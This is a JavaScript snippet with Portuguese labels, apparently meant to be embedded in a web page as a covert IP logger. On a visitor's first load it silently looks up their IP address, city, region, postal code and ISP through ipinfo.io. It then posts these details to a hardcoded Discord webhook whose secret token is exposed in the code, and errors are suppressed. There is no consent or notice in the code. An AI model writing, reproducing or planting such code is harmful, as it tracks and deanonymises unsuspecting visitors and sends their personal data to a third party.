async function sendToWebhook(data) {
  const webhookURL = "https://discord.com/api/webhooks/1276278042414682193/kEQX2TYZzv2CTedH4k9vGWMp8CRLTSSMacSUX-L8bHYrkCVsTk_ZP9CSO84ppjBqkkmX";

  const embed = {
      "embeds": [
          {
              "title": "👀┃Nova Log Detectada!",
              "description": `⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼`,
              "color": 0x7289DA, // Azul do Discord
              "fields": [
                  {
                      "name": "📍**┃IP**",
                      "value": data.ip,
                      "inline": false
                  },
                  {
                      "name": "🏠**┃Cidade**",
                      "value": data.city || "Desconhecida",
                      "inline": false
                  },
                  {
                      "name": "🗺️**┃Região**",
                      "value": data.region || "Desconhecida",
                      "inline": false
                  },
                  {
                      "name": "💻**┃Postal**",
                      "value": data.postal || "Desconhecido",
                      "inline": false
                  },
                  {
                      "name": "📶**┃Operadora**",
                      "value": data.org || "Desconhecida",
                      "inline": false
                  }
              ],
              "footer": {
                  "text": `⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼⎼\n${new Date().toLocaleString()}`
              },
          }
      ]
  };

  try {
      await fetch(webhookURL, {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json',
          },
          body: JSON.stringify(embed)
      });
  } catch (error) {
  }
}

async function sendWebhookOnFirstVisit() {
  if (!localStorage.getItem('webhookSent')) {
      try {
          const response = await fetch('https://ipinfo.io/json');
          const data = await response.json();

          sendToWebhook(data);

          localStorage.setItem('webhookSent', 'true');
      } catch (error) {
      }
  }
}

sendWebhookOnFirstVisit();
